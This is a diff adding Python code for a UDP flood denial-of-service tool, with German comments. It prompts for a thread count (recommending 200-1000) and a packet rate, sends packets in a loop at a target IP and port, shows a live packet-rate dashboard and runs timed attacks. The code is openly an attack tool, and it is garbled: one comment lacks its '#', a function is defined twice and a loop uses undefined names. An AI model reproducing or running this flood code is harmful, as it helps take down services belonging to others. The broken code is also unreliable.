@@ -1,0 +1,55 @@
+#UDP Flood
+def udp_flood(ip, port, packet_size):
+    global packet_counter
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1)  # Empfangsbuffer minimieren
+    udp_bytes = b"\x00" * packet_size  # Statische Daten für mehr Effizienz
+
+    while not stop_event.is_set():
+        try:
+            for _ in range(100):  # Mehrere Pakete in kurzer Zeit senden
+                sock.sendto(udp_bytes, (ip, port))
+                packet_counter += 1
+        except:
+            pass
+
+
+#Anzahl der Threads
+threads = int(input("Anzahl der Threads (Empfehlung: 200-1000): "))
+
+Erhöhung der Paketrate
+packet_rate = int(input("Maximale Pakete pro Sekunde (z. B. 50000): "))
+#Schleife
+start_time = time.time()
+while not stop_event.is_set():
+    try:
+        sock.sendto(udp_bytes, (ip, port))
+        packet_counter += 1
+        if packet_counter / (time.time() - start_time) > packet_rate:
+            time.sleep(0.001)  # Drosseln, falls nötig
+    except:
+        pass
+
+#Live Dashboard
+def dashboard():
+    global packet_counter
+    start_time = time.time()
+    while not stop_event.is_set():
+        elapsed = time.time() - start_time
+        rate = packet_counter / elapsed if elapsed > 0 else 0
+        print(f"\r[INFO] Gesendete Pakete: {packet_counter} | Paketrate: {rate:.2f}/s", end="")
+        time.sleep(1)
+
+#Attack Dauer
+def udp_flood(ip, port, packet_size, duration):
+    global packet_counter
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    udp_bytes = b"\x00" * packet_size
+    end_time = time.time() + duration
+
+    while time.time() < end_time and not stop_event.is_set():
+        try:
+            sock.sendto(udp_bytes, (ip, port))
+            packet_counter += 1
+        except:
+            pass
